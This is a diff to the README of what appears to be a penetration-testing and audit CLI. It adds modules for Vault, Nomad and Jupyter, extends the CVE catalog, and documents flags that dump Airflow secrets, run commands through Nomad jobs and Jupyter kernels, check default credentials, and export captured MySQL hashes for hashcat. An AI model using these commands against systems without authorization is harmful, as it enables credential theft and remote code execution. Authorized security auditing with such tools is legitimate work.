@@ -68,11 +68,11 @@ duplicates removed from the module catalog:
 | pgAdmin 4 | `admin@example.com:admin`, `admin@admin.com:admin` |
 | Redis Insight | No native UI password. `redis:password`, `admin:admin` apply only if a confirmed reverse proxy Basic challenge protects the UI. |
 
-`consul`, `keycloak`, and `qdrant` have no `--defcreds`; use token/API-key options. KubeAPI tests pairs only if Basic is advertised. ZooKeeper/Keeper need a protected znode: `credentials unverified` does **not** mean a wrong password. Rate limiting or account lock stops further attempts.
+`consul`, `keycloak`, `nomad`, `jupyter`, and `qdrant` have no `--defcreds`; use token/API-key options. KubeAPI tests pairs only if Basic is advertised. ZooKeeper/Keeper need a protected znode: `credentials unverified` does **not** mean a wrong password. Rate limiting or account lock stops further attempts.
 
 ## Offline CVE coverage
 
-Every audit command accepts `--enum-cve`, but a confirmed product, suitable version and catalog match are needed for a finding. The bundled catalog contains **210 records** (revision `2026-10-16`):
+Every audit command accepts `--enum-cve`, but a confirmed product, suitable version and catalog match are needed for a finding. The bundled catalog contains **215 records** (revision `2026-10-20`):
 
 | Product | CVEs | Product | CVEs |
 | --- | ---: | --- | ---: |
@@ -91,7 +91,9 @@ Every audit command accepts `--enum-cve`, but a confirmed product, suitable vers
 | Jenkins WSO2ID OAuth plugin | 1 | Kubernetes | 1 |
 | OpenSearch | 1 | pgAdmin 4 | 1 |
 | Proxmox VE | 1 | | |
-| **Total** | **210** | | |
+| Vault / Vault Enterprise | 1 / 1 | Nomad / Nomad Enterprise | 1 / 1 |
+| Jupyter Server | 1 | | |
+| **Total** | **215** | | |
 
 Known-version matches mean *potentially affected*, not confirmed exploitability; backports and configuration matter. With an unknown version, catalogued CVEs from the last four years appear as yellow speculative findings. The window uses publication dates or a conservative CVE-year fallback. `PR:L` requires verified anonymous access or explicit credentials, not merely `--defcreds`; elevated-permission entries are omitted when the version is unknown. Some Nexus, Grafana and Keycloak entries have additional prerequisites that version matching does not prove. The catalog focuses on High/Critical network issues other than pure DoS. Generic Docker Registry and gRPC have no product match; Kafka broker lacks an exact release and Keeper has no entries. UI-only targets use their own product/version. JSON includes ranges, fixes, CVSS and references.
 
@@ -108,6 +110,9 @@ These are product-specific HTTP probes, not browser automation. UI login never p
 | `grafana` | Grafana web/API | Native |
 | `harbor` | Harbor portal/API | Native |
 | `jenkins` | Jenkins web/API | Native |
+| `jupyter` | Jupyter Server / Notebook API | Native |
+| `nomad` | Nomad HTTP API | Native |
+| `vault` | Vault HTTP API | Native |
 | `kafka` | Kafbat UI, Provectus Kafka UI, AKHQ, Redpanda Console | Related panels |
 | `keycloak` | Realm/OIDC endpoints and token-authorized Admin API | Native web/API |
 | `kubeapi` | Kubernetes Dashboard | Related panel |
@@ -143,9 +148,13 @@ Replace example targets and credentials. Add `--defcreds` or `--enum-cve` where 
 redposture airflow -t https://airflow.example:8080 -u auditor -p 'password' --show-dags --show-keys --show-connections --discover
 redposture airflow -t https://airflow.example:8080 -u auditor -p 'password' --dump
 redposture airflow -t https://airflow.example:8080 -u auditor -p 'password' --dump --dag example --key warehouse_password --connection warehouse
+redposture airflow -t https://airflow.example:8080 -u auditor -p 'password' --show-dagsources
+redposture airflow -t https://airflow.example:8080 -u auditor -p 'password' --dagsource FILE_TOKEN --dump
 ```
 
 `--dump` reads DAG source, Variables and Connections; without selectors it reads all three. The default budget is 50 MiB and five minutes per target.
+
+`--show-dagsources` lists source IDs, paths and associated DAGs; add `--dump` for all source code. `--dagsource` selects one or more sources: use `file_token` on Airflow 2 or `dag_id` on Airflow 3.
 
 ### ClickHouse
 
@@ -210,6 +219,17 @@ redposture jenkins -t https://ci.example/jenkins -u auditor --api-token-file tok
 
 Jenkins confirms credentials through its identity endpoint. `--show-artifacts` lists names and sizes without downloading content; visibility follows account permissions.
 
+### Vault, Nomad and Jupyter
+
+```bash
+redposture vault -t https://vault.example:8200 --token-file token.txt --show-mounts --show-auth --enum-cve
+redposture vault -t https://vault.example:8200 --token-file token.txt --mount secret --discover
+redposture nomad -t http://nomad.example:4646 --token-file token.txt --namespace default --show-jobs --show-nodes --show-members --discover --enum-cve
+redposture jupyter -t http://notebooks.example:8888 --token-file token.txt --show-contents --show-sessions --show-kernels --discover --enum-cve
+```
+
+Vault `--defcreds` checks the common development token `root`; acceptance does not prove dev mode. Nomad verifies tokens through ACL token-self; Jupyter requires a protected API becoming readable, so arbitrary tokens on an open server remain unverified. Inventory and discovery use read-only requests: KV v1/v2 secrets, Nomad job specs, and notebook contents. `RCE:potential` indicates an exposed capability surface, not confirmed command execution. Detection, inventory and discovery create no jobs or kernels. Explicit Nomad `--probe-submit` registers and purges a stopped job; `--execute` runs a command in a temporary `raw_exec` job, or in `--allocation` / `--task`. Jupyter `--execute` uses a new Python kernel, with `--execute-via terminal` available separately; `--show-terminals` lists existing terminals. Execution reports stdout, stderr and exit code and removes its own temporary resources. Use `--execute-timeout` and `--execute-max-bytes` to bound execution and captured output. Terminal output merges stdout/stderr. See the [local labs and commands](tests/fixtures/token_apis/README.md). Denied branches and safety limits mark discovery `partial`. Vault/Nomad CVE ranges distinguish Community and Enterprise editions; unresolved edition is not guessed.
+
 ### gRPC
 
 ```bash
@@ -250,6 +270,8 @@ Interactive mode asks for cluster/worker selection and `y` confirmation. `--yes`
 
 ### KubeAPI
 
+The service summary checks namespace and pod list access automatically. `auth required:True` means neither resource is accessible anonymously; access flags reflect the verified credentials when provided.
+
 ```bash
 redposture kubeapi -t https://cluster.example:6443 --token "$KUBE_TOKEN" --secrets
 ```
@@ -259,6 +281,8 @@ redposture kubeapi -t https://cluster.example:6443 --token "$KUBE_TOKEN" --secre
 ```bash
 redposture minio -t https://minio.example:9000 -u minioadmin -p 'password' --show-buckets --show-objects --discover
 ```
+
+Credential checks fall back to account-info and, with `--bucket`, bucket location. `--debug` shows each probe's HTTP status, S3 error code and verdict.
 
 ### MongoDB
 
@@ -343,9 +367,12 @@ redposture zookeeper -t zk.example -u auditor -p 'password' --show-znodes 20 --d
 redposture exporters scan -t targets.txt
 redposture exporters collect -t targets.txt --deep
 redposture exporters trigger -t targets.txt --callback-dns callback.example
+redposture exporters trigger -t targets.txt -e mysql --callback-dns callback.example --export-hashcat mysql.hashes
 ```
 
 Trigger supports Redis, Postgres, Blackbox, Proxmox, MySQL, JSON, Elasticsearch, SNMP and IPMI. It starts callback listeners; `-e` selects exporters, `-s` selects listeners, and `--profiles-file` or exporter-specific auth-module flags add profiles. `CRED!` requires captured credential material, not merely SSRF. MySQL `mysql_native_password` yields a challenge response, not plaintext; SNMPv3/IPMI do not reveal passwords. `-check` can verify captured Redis/Postgres credentials.
+
+MySQL `--export-hashcat [file]` saves unique native-password hashes for hashcat mode 11200; without a filename it uses `mysql_hashes.hashcat`. The file is reset at startup and written immediately as callbacks arrive.
 
 ## Development and checks
 
